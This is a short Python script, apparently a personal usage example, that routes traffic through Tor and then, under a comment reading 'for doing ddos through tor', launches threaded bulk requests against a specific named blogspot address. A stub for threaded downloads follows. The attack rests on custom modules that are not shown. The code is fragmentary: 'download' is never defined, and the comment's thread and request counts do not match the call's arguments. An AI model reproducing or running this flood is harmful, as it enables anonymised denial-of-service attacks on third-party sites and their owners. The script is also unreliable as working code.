#Connect easily to Tor

import tor

# needs fake_useragent
# needs tor on macport installed
# needs socks

# first configure and run tor in terminal
# to connect to Tor, do

tor.connect(printing = False)


"""
REQUESTS
"""
import requestors as r

# for doing ddos through tor

url = "https://manette612.blogspot.com"

# create 100 threads, each sending 100 requests to the url
# the link created counts the number of requests sent
r.structured_sr(url, 10, 10)



"""
DOWNLOAD
"""


"""
links = [
	(link, path, name)
	for download_object in download_list
]

"""

# a threaded download library


n_threads = 4
download(links, n_threads)
